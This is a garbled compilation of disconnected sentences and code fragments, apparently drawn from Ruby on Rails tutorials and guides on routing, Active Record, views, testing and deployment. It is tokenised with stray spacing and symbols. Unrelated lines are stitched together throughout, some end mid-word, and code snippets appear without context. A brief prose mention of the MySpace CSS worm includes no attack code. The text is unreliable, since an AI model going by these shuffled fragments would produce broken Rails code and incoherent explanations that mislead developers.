It is important that this folder is shared between deployments so that remotely ╼ cached pages referencing the old compiled assets still work for the life of ╼ the cached page .
Computes the url to a JavaScript asset in the `app / assets / javascripts` directory ▖
You might get a &quot; This ╼ won &apos;t be accepted ▖ &quot;
Despite this impressive list , there is still much to learn about Rails .
The first line indicates that we are describing the Home page .
in Listing ~ \ ref { code : help _ view _ full _ html } and
content _ type : &quot; text / plain &quot; ,
A sample account activation email from the server log .
This is the case , for example , in the code
For example , it may be important to your application to ensure that ╼ every user provides a valid email address and mailing address ▖
Finally , Figure ~ \ ref { fig : user _ profile _ microposts _ page _ 2 _ rails _ 3 } shows the \ emph { second } page of microposts for the first user , along with the pagination links at the bottom of the display .
Install RubyGems
The first Rails Tutorial application running on Heroku ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / heroku _ app _ 4 _ 0-full ▖ png } { ( full size ) }
Fix this problem by writing a direct test of the \ kode { full \ _ title } helper , which involves creating a file to test the application helper and then filling in the code indicated with \ kode { FILL \ _ IN } in Listing ~ \ ref { code : full _ title _ helper _ tests } .
Everything else is the same as `form _ for` ▖
time _ range = ( Time ▖ now ▖ midnight - 1 ▖ day ) ▖ .
This would generate SQL like :
```html + erb
@ document ▖ paragraphs
( Why don &apos;t we have to test the stats on the Home page separately ? )
Note also the addition of the \ texttt { rails \ _ 12factor } gem , which is used by Heroku to serve static assets such as images and stylesheets .
in Listing ~ \ ref { code : micropost _ dependency _ test } .
Layouts specified at the controller level support the ` : only` and ` : except` options ▖
The login form is designed to create a new session to log a user in .
For more information , see the Heroku documentation on \ href { https : / / devcenter ▖ heroku ▖ com / articles / error-pages } { error pages } .
Because many testing tools represent failing tests with the color red and passing tests with the color green , this sequence is sometimes known as the ``Red , Green , Refactor &apos; &apos; cycle .
To allow users to log out , we &apos;ll define methods to forget users in analogy with the ones to remember them .
This chapter will cover all of these ideas as well .
In order to make a user profile page , we need to have a user in the database , which introduces a chicken-and-egg problem : how can the site have a user before there is a working signup page ?
A user profile with a follow button ( \ href { http : / / localhost : 3000 / users / 2 } { / users / 2 } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / profile _ follow _ button _ bootstrap-full ▖ png } { ( full size ) }
* `stylesheet _ engine` configures the stylesheet engine ( for eg ▖ sass ) to be used when generating assets ▖
Unknown action new for ArticlesController ! &#93; (
MySpace blocks many tags , however it allows CSS ▖ So the worm &apos;s author put JavaScript into CSS like this :
in Listing ~ \ ref { code : name _ title _ and _ heading } .
The simplified user \ kode { index } action for the toy application .
By using the \ kode { log \ _ in \ _ as } method defined in Listing ~ \ ref { code : test _ helper _ log _ in } , we can test the \ kode { edit } and \ kode { update } actions as in Listing ~ \ ref { code : edit _ update _ wrong _ user _ tests } .
The initial Sessions controller .
in Listing ~ \ ref { code : flash _ test } .
You can stack callbacks on a single event by passing them as an array :
The code in Listing ~ \ ref { code : user _ index _ view } uses the result of Listing ~ \ ref { code : gravatar _ option _ redux } from Section ~ \ ref { sec : exercises _ a _ gravatar _ image } , which allows us to pass an option to the Gravatar helper specifying a size other than the default .
NOTE : `belongs _ to` associations _ must _ use the singular term ▖
╼ * = require _ tree .
Let &apos;s first take a look at what the layout looks like after the partials are defined ( Listing ~ \ ref { code : layout _ with _ partials } ) .
&quot; 0 microposts &quot;
It also includes a validation for the \ kode { password \ _ digest } attribute ▖ )
These actions don &apos;t typically render pages ( although they can ) ; instead , their main purpose is to modify information about users in the database .
* ` : polymorphic`
Safe updating through the web is enforced using strong parameters .
In particular , we &apos;ll check that attempts to access actions in the Relationships controller require a logged-in user ( and thus get redirected to the login page ) , while also not changing the Relationship count , as shown in Listing ~ \ ref { code : relationships _ access _ control } .
All validations inside of `with _ options` block will have automatically passed ╼ the condition `if : : is _ admin ? `
The default error message for this helper is _ &quot; doesn &apos;t match confirmation &quot; _ .
d = Date ▖ new ( 2012 , 9 , 16 ) # = &gt; Sun , 16 Sep 2012
In Production
Turning the model into this :
See if you can guess why .
How do we know if we really destroyed an object ?
- &gt; 0 ▖ 0019s
Here \ kode { users } corresponds to the fixture filename \ kode { users ▖ yml } , while the symbol \ kode { : michael } references user with the key shown in Listing ~ \ ref { code : real _ user _ fixture } .
in Listing ~ \ ref { code : successful _ edit _ test } .
With that , apart from one refinement , the basic functionality of user activation is done .
Signing in the user upon signup .
# # # `find _ or _ initialize _ by`
In the case of the StaticPages controller , both its methods are initially empty :
NOTE : There &apos;s no need to use `includes` for immediate associations - that is , if you have `Order belongs _ to : customer` , then the customer is eager-loaded automatically when it &apos;s needed .
For example , consider a simple Rails application that includes a model for customers and a model for orders ▖
layout false
There are also many web development shops that specialize in Rails , such as \ href { http : / / entp ▖ com / } { ENTP } , \ href { http : / / thoughtbot ▖ com / } { thoughtbot } , \ href { http : / / pivotallabs ▖ com / } { Pivotal Labs } , and \ href { http : / / hashrocket ▖ com / } { Hashrocket } , plus innumerable independent consultants , trainers , and contractors .
( Inserting the debug information into tests probably wouldn &apos;t do any harm , but it probably wouldn &apos;t do any good , either , so it &apos;s best to restrict the debug display to development only ▖ )
In this section , we &apos;ll give our lonely sample user some company .
A \ kode { before \ _ save } callback is automatically called before the object is saved , which includes both object creation and updates , but in the case of the activation digest we only want the callback to fire when the user is created .
&lt; % = submit _ tag % &gt;
At this point , all the tests should be passing :
It asserts that a given path is recognized and routes it to a particular spot in your application ▖
# # # `rails server`
# # # # Critical Files
Commenting out \ kode { has \ _ secure \ _ password } for the sake of TDD .
# &lt; Client id : 220 , first _ name : &quot; Sara &quot; &gt;
╼ var = boolean ? ?
# # # CacheHelper
The `create _ association` method returns a new object of the associated type ▖
With the asset pipeline , we don &apos;t have to choose between speed and convenience : we can work with multiple nicely formatted files in development , and then use the asset pipeline to make efficient files in production .
This
The complete steps needed to get the signin features to pass .
In this chapter , we &apos;ll develop a toy demo application to show off some of the power of Rails .
This method call will look something like this :
to your `Client` model ▖
You can define assets for precompilation in `engine ▖ rb` :
If you click a link , it ╼ does the same process : fetch the page , fetch the assets , put it all together , ╼ show you the results ▖
This means that you can comment or remove the following option in the `config / initializers / wrap _ parameters ▖ rb` file :
For example , let &apos;s define a function \ kode { string \ _ message } that takes a single \ emph { argument } and returns a message based on whether the argument is empty or not :
as shown in Listing ~ \ ref { code : first _ migration } .
The normally hidden \ kode { ▖ gitignore } file made visible .
You can also render a block of code within a partial layout instead of calling `yield` ▖
\ texttt { GET } is the most common HTTP operation , used for \ emph { reading } data on the web ; it just means ``get a page &apos; &apos; , and every time you visit a site like google ▖ com or wikipedia ▖ org your browser is submitting a \ texttt { GET } request ▖ \ texttt { POST } is the next most common operation ; it is the request sent by your browser when you submit a form .
@ url = user _ url ( @ user )
client = Client ▖ readonly ▖ first
Linking the button to the Signup page .
* `config ▖ middleware ▖ use ( new _ middleware , args ) ` - Adds the new middleware at the bottom of the middleware stack .
* ` : delete` causes the associated object to be deleted directly from the database ( so callbacks will not execute )
You can quickly test the RDoc output with the following command :
For coherence with the built-in methods only relative paths are accepted .
Or you can remove them .
in Listing ~ \ ref { code : edit _ update _ wrong _ user _ tests } .
( As noted above , testing the third branch is left as an exercise ▖ )
In the rare circumstance that an exercise solution is used subsequently , it is explicitly solved in the main text .
# Declares an attribute reader backed by an internally-named
When asset pipelining is enabled , these files are preprocessed and ╼ placed in the `public / assets` directory for serving by either the Rails app or ╼ web server .
# Precompile additional assets ( application ▖ js , application ▖ css , and all
First , we will make a comment partial to extract showing all the comments for ╼ the article ▖
The technique involves using \ emph { embedded Ruby } in our views .
Invoice ▖ find _ in _ batches do &#124; invoices &#124;
in Listing ~ \ ref { code : index _ final _ refactoring } and
On OS ~ X , \ kode { brew install imagemagick } should work if you have \ href { http : / / brew ▖ sh / } { Homebrew } installed .
has _ one : account
# For APIs , you may want to use : null _ session instead .
/ / = require library _ name
* `collection ▖ build ( attributes = { } , ▖ ▖ ▖ )
On pages generated by `NewsController` , you want to hide the top menu and add a right menu :
A micropost belongs to a user .
Date ▖ new ( 2000 , 5 , 31 ) ▖ prev _ month # = &gt; Sun , 30 Apr 2000
It covers a lot of material , and it &apos;s OK not to get it all on the first pass .
d ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ % subsection format _ validation ( end ) ╼ ╼ \ subsection { Uniqueness validation } % ( fold ) ╼ \ label { sec : uniqueness _ validation } ╼ ╼
# # # Average
Setting the root route to the Home page .
The method `foreign _ key` gives a foreign key column name from a class name ▖
Active Record database connections are managed by `ActiveRecord : : ConnectionAdapters : : ConnectionPool` which ensures that a connection pool synchronizes the amount of thread access to a limited number of database connections ▖
&gt; &gt; Person ▖ create !
To override the name of the `lock _ version` column , `ActiveRecord : : Base` provides a class attribute called `locking _ column` :
= &gt; # &lt; Word : 0x22d0b20 &gt;
The second way to declare a many-to-many relationship is to use `has _ many : through` ▖
in Listing ~ \ ref { code : signup _ route } .
The following list explains the purpose of each of them :
if options &#91; : usage &#93;
mattr _ accessor : load _ once _ paths
Everyone goes through it .
We &apos;d need to do something like this :
The result for a representative sample of valid email addresses appears in Listing ~ \ ref { code : email _ format _ valid _ tests } .
app / assets / stylesheets
To define the named routes for the Help , About , and Contact pages , we need to make changes to the \ kode { get } rules from Listing ~ \ ref { code : contact _ route } , transforming lines like
If you have trouble , try running
Now we &apos;re ready to start making the app itself .
&gt; , ▖ ▖ ▖ }
Since we &apos;ll be making a controller to handle static pages , we &apos;ll call it the StaticPages controller .
Note that the \ kode { destroy } action uses method chaining to combine the \ kode { find } and \ kode { destroy } into one line :
It takes the type of the link ( ` : rss` or ` : atom` ) , a hash of options that are passed through to url _ for , and a hash of options for the tag :
The method `years _ ago` receives a number of years and returns the same date those many years ago :
# Use sqlite3 as the database for Active Record
We can create a large number of test users using embedded Ruby inside fixtures .
Here the test suite takes more than seven seconds to run even though the actual tests run in under a tenth of a second .
# perform a partial update
( In the language of \ href { http : / / en ▖ wikipedia ▖ org / wiki / Extreme _ Programming } { Extreme Programming ( XP ) } , this exploratory step is called a \ emph { spike } ▖ )
As required , initially our test suite is passing ( \ passing ) .
which is only a marker , its body or return value are irrelevant ▖
Using a \ kode { div } tag in place of \ kode { footer } would work as well .
When you ╼ do this you need to configure the &quot; origin &quot; of the CDN to point back at your ╼ website `example ▖ com` , check your provider for documentation on configuring the ╼ origin server .
We can choose any migration name we want , but it &apos;s convenient to end the name with \ kode { to \ _ users } , since in this case Rails automatically constructs a migration to add columns to the \ kode { users } table .
A preliminary version of the Sessions \ kode { create } action .
( For a deeper understanding , I recommend \ emph { The Rails ~ 4 Way } by Obie Fernandez ▖ )
This object will be instantiated from the passed attributes , and the link through this object &apos;s foreign key will be set , but the associated object will _ not _ yet be saved .
# # # # Joining Multiple Associations
The solution is to \ emph { paginate } the users , so that ( for example ) only 30 show up on a page at any one time .
An array is just a list of elements in a particular order .
# lib / blorgh / engine ▖ rb
For instance , we don &apos;t test how long the ``remember me &apos; &apos; cookie lasts or whether it gets set at all .
Although the ` : counter _ cache` option is specified on the model that includes the `belongs _ to` declaration , the actual column must be added to the _ associated _ model ▖
Those attributes are automatically added to the `articles` ╼ table in the database and mapped to the `Article` model .
This includes your application , engines , Rails frameworks and any other registered namespace .
The new signup page at \ href { http : / / localhost : 3000 / signup } { / signup } .
Some more uses of \ kode { assert \ _ select } appear in Table ~ \ ref { table : assert _ select } .
Limit and Offset
Creates a hidden form input field used to transmit data that would be lost due to HTTP &apos;s statelessness or data that should be hidden from the user .
The missing files and directories are back .
In Section ~ \ ref { sec : remember _ me } , we &apos;ll add sessions that persist even after closing the browser .
DELETE / articles / : id ( ▖ : format ) articles # destroy
* Controlling association scope
# template ▖ rb
This method receives an arbitrary number of action names , and an optional hash of options as last argument ▖
# # # Action Mailer Layouts
\ href { http : / / www ▖ railstutorial ▖ org / screencasts } { The \ emph { Ruby on Rails Tutorial } screencasts } : I have prepared a full-length screencast course based on this book .
&#124; `raise _ delivery _ errors` &#124; Whether or not errors should be raised if the email fails to be delivered ▖
&lt; % = form _ for @ person , url : { action : &quot; update &quot; } do &#124; person _ form &#124; % &gt;
Before , this was more explicit : we used
Client ▖ where ( orders _ count : &#91; 1,3,5 &#93; )
* &#91; jquery-ujs list of external articles &#93; ( https : / / github ▖ com / rails / jquery-ujs / wiki / External-articles )
These errors are associated with a particular Active Record object , but this strategy won &apos;t work here because the session isn &apos;t an Active Record model .
do _ something _ returning _ a _ string ( string )
\ emph { Extra credit } : Show that Rails supports non- \ href { http : / / es ▖ wikipedia ▖ org / wiki / ASCII } { ASCII } characters by including an inverted exclamation point , as in `` ¡ Hola , mundo ! &apos; &apos;
Validating the email format with a regular expression ▖
For example , you may want to confirm an email address ╼ or a password ▖
The scaffold code may have extra newlines compared to Listing ~ \ ref { code : demo _ microposts _ resource } .
The user edit page ( \ href { http : / / localhost : 3000 / users / 1 / edit } { / users / 1 / edit } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / demo _ edit _ user _ rails _ 3-full ▖ png } { ( full size ) }
Client ▖ where ( locked : true )
&quot; digest &quot; : &quot; 12b3c7dd74d2e9df37e7cbb1efa76a6d &quot; } , &quot; application-1c5752789588ac18d7e1a50b1f0fd4c2 ▖ css &quot; : { &quot; logical _ path &quot; : &quot; application ▖ css &quot; , &quot; mtime &quot; : &quot; 2013-07-26T22 : 56 : 17-07 : 00 &quot; , &quot; size &quot; : 1591 ,
* A namespaced `ApplicationController` stub
There are two kinds of Active Record objects : those that correspond to a row ╼ inside your database and those that do not ▖
$ bundle exec rake test ╼ 3 tests , 3 assertions , 0 failures , 0 errors , 0 skips
Also , you can pass a block to `cattr _ * ` to set up the attribute with a default value :
Note that the URL is \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 } { / users / 1 } ; as you might suspect , the number ~ \ kode { 1 } is simply the user &apos;s ~ \ kode { id } attribute from Figure ~ \ ref { fig : demo _ user _ model } .
Thanks to social wisdom and positive constructiveness all around , `forty _ two` is also available .
( This requires adding credit card information to your Heroku account , but there is no charge when verifying an account ▖ )
Since the \ kode { Word } class inherits from \ kode { String } , we can use the console to see the class hierarchy explicitly :
as shown in Listing ~ \ ref { code : account _ activation _ preview } .
in Listing ~ \ ref { code : new _ user _ with _ partial } and
Rails will render the ` _ product _ ruler` partial ( with no data passed in to it ) between each pair of ` _ product` partials .
Computes the path to an image asset in the `app / assets / images` directory ▖
in Listing ~ \ ref { code : development _ email _ settings } .
Remove the RJS setting `config ▖ action _ view ▖ debug _ rjs = true` .
\ emph { Extra credit } : Write integration tests for both / users and / users / : id .
We &apos;ll actually be using the `--mountable` option here , which includes ╼ all the features of `--full` , and then some ▖
Let &apos;s remedy this sad situation .
Show action for articles &#93; ( images / getting _ started / show _ action _ for _ articles ▖ png )
We can demonstrate one way to handle this with a contrived example :
as shown in Listing ~ \ ref { code : micropost _ accessible _ attribute } .
No user images
Article ▖ recent ▖ many ?
Of course , using a testing framework that isn &apos;t pure Ruby has a downside , and I find that the plain-text stories can be a bit verbose .
A mockup of the user profile made in this section .
@ product = Product ▖ find ( params &#91; : id &#93; )
For example , the line
Much of the secure password machinery will be implemented using a single Rails method called \ kode { has \ _ secure \ _ password } ( first introduced in Rails ~ 3 ▖ 1 ) .
Copyright and license
Versus the CDN copy .
Implement this feature for the sample application .
* Rails 4 ▖ 0 deprecates the ` : confirm` option for the `link _ to` helper ▖
delegate : logger , to : : Rails
To get the page defined in Listing ~ \ ref { code : microposts _ home _ page } working , we need to create and fill in a couple of partials .
create app / views / users
A recap of the final status feed , shown in Figure ~ \ ref { fig : page _ flow _ home _ page _ feed _ mockup } , appears again in Figure ~ \ ref { fig : home _ page _ feed _ mockup } .
# &lt; id &gt; 4404 &lt; / id &gt;
# # { @ comment ▖ text }
# = &gt; &#91; &quot; David &quot; , &quot; Jeremy &quot; , &quot; Jose &quot; &#93;
╼ &gt; &gt; 1 ▖ kilobyte ╼ = &gt; 1024 ╼ &gt; &gt; 5 ▖ megabytes ╼ = &gt; 5242880
How these hashes are generated is covered in the &#91; In ╼ Production &#93; ( # in-production ) section later on in this guide .
person ▖ errors ▖ full _ messages
# = &gt; { nil = &gt; nil , 1 = &gt; 1 , nested : { a : 3 , 5 = &gt; 5 } }
By filling in the missing elements in Listing ~ \ ref { code : login _ create _ user _ instance } and Listing ~ \ ref { code : improved _ remember _ me _ test } ( indicated with question marks ~ \ kode { ? } and \ kode { FILL \ _ IN } ) , complete this improved test of the ``remember me &apos; &apos; checkbox .
# RFC says only cache for 1 year
```yaml
You have successfully signed up to example ▖ com ,
To complete a working signup form , we need to fill in the commented-out section in Listing ~ \ ref { code : create _ action _ strong _ parameters } with the appropriate behavior .
This creates ``getter &apos; &apos; and ``setter &apos; &apos; methods that allow us to retrieve ( get ) and assign ( set ) \ kode { @ name } and \ kode { @ email } \ emph { instance variables } , which were mentioned briefly in Section ~ \ ref { sec : mvc _ in _ action } and Section ~ \ ref { sec : static _ pages _ exercises } .
# # # ` : message`
$ ls -l
This ╼ signals all caches between your server and the client browser that this content ╼ ( the file served ) can be cached for 1 year ▖
The engine simply requires this class to define a ╼ `find _ or _ create _ by` method which returns an object of that class , to be ╼ associated with an article when it &apos;s created ▖
At this point , our deletion code is well-tested , and the test suite should be \ passing :
@ @ field _ error _ proc = Proc ▖ new { ▖ ▖ ▖ }
I suggest reading through it at some point , and I also suggest taking a look at the \ href { http : / / guides ▖ rubyonrails ▖ org / routing ▖ html } { Rails Guides article ``Rails Routing from the outside in &apos; &apos; } for a much more in-depth treatment of routes .
User ▖ active
The `size` method returns the total number of error messages for the object .
Via : 1 ▖ 1 varnish
* The concepts of database migrations , validations and callbacks .
Finally , in Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } we &apos;ll add account activation ( thereby confirming a valid email address ) and password resets .
# # # Specifying Conditions on Eager Loaded Associations
&lt; % = stylesheet _ link _ tag &quot; main _ print &quot; , media : &quot; print &quot; % &gt;
Here &apos;s a migration that ╼ creates a table :
To do that , it must first ╼ be copied using this command :
has _ many : sections
A `has _ many : through` association is often used to set up a many-to-many connection with another model ▖
if @ order ▖ customer ▖ nil ?
In this section , we &apos;ll write an integration test covering two of the three branches in Listing ~ \ ref { code : password _ reset _ update _ action } , invalid and valid submission .
Note that there is no limit in nesting levels ▖
# &lt; author &gt; Joshua Peek &lt; / author &gt;
class CreateAppointments &lt; ActiveRecord : : Migration
To write the implementation , we start by adding a checkbox to the login form from Listing ~ \ ref { code : login _ form } .
The original source is ╼ stored in `data` ▖
* `collection ▖ find ( ▖ ▖ ▖ )
= &gt; &quot; 2 women &quot;
Engines can also be isolated from their host applications ▖
def self ▖ # { method _ id } ( * args )
* What the asset pipeline is and what it does .
t ▖ advance ( seconds : 1 )
( We &apos;ll write these actions in Section ~ \ ref { sec : a _ working _ follow _ button _ the _ standard _ way } ▖ )
Date ▖ new ( 2010 , 5 , 24 ) ▖ weeks _ ago ( 1 ) # = &gt; Mon , 17 May 2010
We &apos;ll be using sessions to implement the common pattern of ``signing in &apos; &apos; , and in this context there are several different models for session behavior common on the web : ``forgetting &apos; &apos; the session on browser close , using an optional ``remember me &apos; &apos; checkbox for persistent sessions , and automatically remembering sessions until the user explicitly signs out
If you want to find the minimum value of a field in your table you can call the `minimum` method on the class that relates to the table ▖
&lt; % benchmark &quot; Process data files &quot; do % &gt;
In Section ~ \ ref { sec : signup _ error _ messages } , we used an error-messages partial to display error messages , but we saw in that section that those messages are provided automatically by Active Record .
The profiles in this section will be the first truly dynamic pages in our application .
Freezing your system to this particular version will help prevent conflicts as RubyGems changes in the future .
You can use multiple
However , because Turbolinks overrides the normal page loading process , the ╼ event that this relies on will not be fired ▖
validates : terms _ of _ service , acceptance : true
Even with the ability to run tests inside of Sublime Text , I still sometimes prefer using Guard , but at this point my bread-and-butter TDD technique is the one enumerated above .
class ApplicationController &lt; ActionController : : Base
An annotated \ kode { title \ _ helper } .
create test / mailers / user _ mailer _ test ▖ rb
With the fixtures defined in Listing ~ \ ref { code : users _ fixtures _ extra _ users } , we &apos;re ready to write a test of the users index .
adapter : jdbcsqlite3
╼ $ kill -9 12241
&#124; PATCH / PUT &#124; / comments / : id ( ▖ : format ) &#124; comments # update &#124; sekret _ comment _ path &#124;
&lt; script src = &quot; / assets / application ▖ js &quot; &gt; &lt; / script &gt;
$ ( &quot; a &#91; data-background-color &#93; &quot; ) ▖ click ( e ) - &gt;
# &lt; Client id : 220 , first _ name : &quot; Sara &quot; &gt; ,
@ customer = @ order ▖ create _ customer ( customer _ number : 123 ,
For example , with this route :
number _ to _ currency ( 1234567890 ▖ 50 ) # = &gt; $ 1,234,567,890 ▖ 50
&lt; option value = &quot; 12 &quot; &gt; India &lt; / option &gt;
A shorthand for this is to use a hash mapping attribute names to the desired ╼ value , like so :
# # # # `first`
The syntax looks like this :
All source code in the \ emph { Ruby on Rails Tutorial } is available jointly under the \ href { http : / / opensource ▖ org / licenses / MIT } { MIT License } and the \ href { http : / / people ▖ freebsd ▖ org / ~ phk / } { Beerware License } .
Accessible attributes
foreign _ key = options &#91; : foreign _ key &#93; &#124; &#124; reflection ▖ active _ record ▖ name ▖ foreign _ key
For readers coming from Windows or ( to a lesser but still significant extent ) Macintosh OS ~ X , the Unix command line may be unfamiliar .
Contributor ▖ limit ( 2 ) ▖ order ( : rank ) ▖ to _ xml
( Because helper methods aren &apos;t available in tests , we can &apos;t use the \ kode { current \ _ user } as in Listing ~ \ ref { code : logged _ in _ p } , but the \ kode { session } method is available , so we use that instead ▖ )
Updating 34f06b7 ▖ ▖ 2c92bef
* ` : even` - Specifies the value must be an even number if set to true ▖
We start by arranging for one of our fixture users to be an admin , as shown in Listing ~ \ ref { code : fixture _ user _ admin } .
In writing this code , we &apos;ve guessed that SQL supports an \ kode { IN } keyword that allows us to test for set inclusion ▖ ( Happily , it does ▖ )
Depending on the arity , the callable is invoked with the `options` hash as first argument with `key` as ` : root` , and `key` singularized as second argument ▖
Let &apos;s say you wanted to route all users on a blacklist to the `BlacklistController` ▖
te } ╼ ╼ % subsection a _ controller _ class ( end ) ╼ ╼ ╼ \ subsection { A user class } % ( fold ) ╼ \ label { sec : a _ user _ class } ╼ ╼
This means that your functional and integration tests that use
The purpose of our tests is to verify that clicking the signup button results in the correct behavior , creating a new user when the information is valid and not creating a user when it &apos;s invalid .
A mockup of the stats partial .
&lt; strong &gt; Text : &lt; / strong &gt;
The result is a display of the feed on the Home page , as required ( Figure ~ \ ref { fig : home _ with _ proto _ feed } ) .
config ▖ log _ level = : info
The method `classify` is the inverse of `tableize` ▖
View Paths
Routes for the Microposts resource .
If you skipped Section ~ \ ref { sec : image _ upload _ in _ production } , be sure to commit and merge your changes :
The engine that will be created in this guide will be called &quot; blorgh &quot; ▖
For example , you might have a picture model that belongs to either an employee model or a product model ▖
Header partial with links .
* SQLite3 : &#91; EXPLAIN QUERY PLAN &#93; ( http : / / www ▖ sqlite ▖ org / eqp ▖ html )
but that isn &apos;t the Rails Way .
If `value` is `nil` an attribute &quot; nil &quot; set to &quot; true &quot; is added ▖
Since the security restrictions for the \ kode { edit } and \ kode { update } actions are identical , we &apos;ll handle them in a single RSpec \ kode { describe } block .
First we generate the relevant test :
For example , the page for listing all users is at \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users } { / users } , and the ╼ page for making a new user is at \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / new } { / users / new } .
Now that you &apos;ve seen how to create a controller , an action and a view , let &apos;s ╼ create something with a bit more substance .
now ▖ change ( hour : 0 )
Client ▖ average ( &quot; orders _ count &quot; )
Ruby has a built-in method `Hash # merge` that merges two hashes :
alid email address , like `` @ example ▖ com &apos; &apos; ? ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-6accd1 &apos; &gt; &lt; / span &gt; ╼ ╼ \ item Destroy each of the users created in the previous exercises ▖ Does Rails display a message by default when a user is destroyed ? ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-abc7bd &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection a _ user _ tour ( end ) ╼ ╼ \ subsection { MVC in action } % ( fold ) ╼ \ label { sec : mvc _ in _ action } ╼ ╼
Note that , because it is now raw SQL , \ kode { followed \ _ user \ _ ids } is \ emph { interpolated } , not escaped .
For each controller there is an associated directory in the `app / views` directory which holds the template files that make up the views associated with that controller ▖
You may have noticed that the new user object had \ kode { nil } values for the \ kode { id } and the magic columns \ kode { created \ _ at } and \ kode { updated \ _ at } attributes .
Whether a changing title represents \ emph { truly } dynamic content is debatable , but in any case it lays the necessary foundation for unambiguously dynamic content in Chapter ~ \ ref { cha : sign _ up } .
Note that the family of `require` directives prevents files ╼ from being included twice in the output .
We &apos;ll see in the next two sections what effects this has .
Open `doc / guides / index ▖ html` in your ╼ web browser to explore the Guides .
In this case , you can use a singular resource to map ` / profile` ( rather than ` / profile / : id` ) to the `show` action :
( See the next section for reporting security issues ▖ )
Controls what happens to the associated objects when their owner is destroyed :
Once you &apos;ve placed your assets in their logical locations , you can use \ emph { manifest files } to tell Rails ( via the \ href { https : / / github ▖ com / sstephenson / sprockets } { Sprockets } gem ) how to combine them to form single files .
This uses the \ kode { xhr } method ( for XmlHttpRequest ) to issue an Ajax request , which causes the \ kode { respond \ _ to } block in Listing ~ \ ref { code : relationships _ controller _ ajax } to execute the proper JavaScript method .
so that the root route went to the \ kode { hello } action in the Application controller .
We can easily add behavior to any link by adding the data ╼ attribute ▖
Setting the root route .
( I include \ kode { exit } in the last line just to demonstrate how to exit the console .
The resulting relationships will be sufficient for developing the application interface .
Rails supports data validations to place constraints on the values of data model attributes .
* `update _ columns`
d = DateTime ▖ new ( 2010 , 2 , 28 , 23 , 59 , 59 )
Within several hours he had over 1 million friend requests , but it creates too much traffic on MySpace , so that the site goes offline ▖
It is aimed both at those who work with software developers and those who aspire to become developers themselves .
in Listing ~ \ ref { code : first _ create _ action } .
In this context , having the hello , toy , and sample apps present in the same project can be inconvenient due to the many common filenames .
In this case , using ` @ parts ▖ assemblies ▖ create` or ` @ parts ▖ assemblies ▖ build` will create orders where the `factory` column has the value &quot; Seattle &quot; .
Adding Bitbucket and pushing up the repository .
Or they could install malicious software through browser security holes on that site ▖
&lt; % = f ▖ label : title % &gt; &lt; br &gt;
= = CreateArticles : migrated ( 0 ▖ 0020s ) = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
In particular , we &apos;ll make an \ kode { activate } method to update the user &apos;s activation attributes and a \ kode { send \ _ activation \ _ email } to send the activation email .
By default this is `false` in test mode and `true` in all other modes .
config ▖ action _ mailer ▖ smtp _ settings = {
This pattern of setting a cookie that expires 20 years in the future became so common that Rails added a special \ kode { permanent } method to implement it , so that we can simply write
Unfortunately , visiting that URL right now just gives an error , as seen in the server log ( Figure ~ \ ref { fig : profile _ routing _ error } ) .
build _ account
EXPLAIN for : SELECT &quot; users &quot; .
You can use the same technique to localize the rescue files in your public directory ▖
The Home page ( \ href { http : / / localhost : 3000 / } { / } ) with follow stats ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / home _ page _ follow _ stats _ bootstrap-full ▖ png } { ( full size ) }
As interpreted by Rails , the REST architecture includes a standard set of URLs and controller actions for interacting with data models .
here we &apos;ll use the corresponding \ kode { assert \ _ difference } method :
class Application &lt; Rails : : Application
Now that we have a working signup page , it &apos;s time to deploy our application and get it working in production .
# # # # hidden _ field
There &apos;s another subtlety to address here : the code \ kode { form \ _ for ( @ user ) } in Listing ~ \ ref { code : user _ edit _ view } is \ emph { exactly } the same as the code in Listing ~ \ ref { code : signup _ form } ---so how does Rails know to use a \ texttt { POST } request for new users and a \ texttt { PATCH } for editing users ?
( Recall from Section ~ \ ref { sec : hashes _ and _ symbols } that hyphens can &apos;t be used in symbols ▖ )
The task definitions are defined throughout the components of Rails ▖
The asset pipeline is enabled by default .
Now that you have a `Template` class , it &apos;s time to associate it with an ╼ extension for template files :
If your application is currently on any version of Rails older than 3 ▖ 2 ▖ x , you should upgrade to Rails 3 ▖ 2 before attempting one to Rails 4 ▖ 0 .
You &apos;ll need to create a ( free ) GitHub account in order to submit an issue , to comment on them or to create pull requests .
HTTP / 1 ▖ 1 302 Found &#91; First standard 302 response &#93;
remove _ method ( method _ name )
You can swap an existing middleware in the middleware stack using `config ▖ middleware ▖ swap` .
as shown in Listing ~ \ ref { code : add _ micropost _ different _ owner } .
What is Active Record ?
I18n ▖ locale = : expert if current _ user ▖ expert ?
invoke assets
Strings are considered to be _ unsafe _ by default :
For example , suppose your application includes these models :
You can also pass in arbitrary local variables to any partial you are rendering with the `locals : { } ` option :
You can use the ` : location` option to set the HTTP `Location` header :
&lt; % = render @ customer % &gt;
This would detect that there are no books with the specified ID , populate the ` @ books` instance variable with all the books in the model , and then directly render the `index ▖ html ▖ erb` template , returning it to the browser with a flash alert message to tell the user what happened .
development :
For example , \ kode { name } should be non-blank , and \ kode { email } should match the specific format characteristic of email addresses .
By design , the Faker gem &apos;s \ emph { lorem ipsum } text is randomized , so the contents of your sample microposts will differ .
# # # `ordinalize`
As described earlier , by placing the gem in the `Gemfile` it will be loaded when ╼ Rails is loaded ▖
In this section , we cover two of the most important improvements , \ emph { nesting } and \ emph { variables } .
Adding a \ kode { hello } action to the Application controller .
You can find detailed instructions on how to test your mailers in the ╼ &#91; testing guide &#93; ( testing ▖ html # testing-your-mailers ) .
In this case , you could include this route declaration :
= &gt; &#91; &quot; n &quot; , &quot; a &quot; , &quot; m &quot; , &quot; e &quot; &#93;
as shown in Listing ~ \ ref { code : micropost _ dependency } .
The simplest template that would work in this case would be one located at ╼ `app / views / articles / new ▖ html ▖ erb` ▖
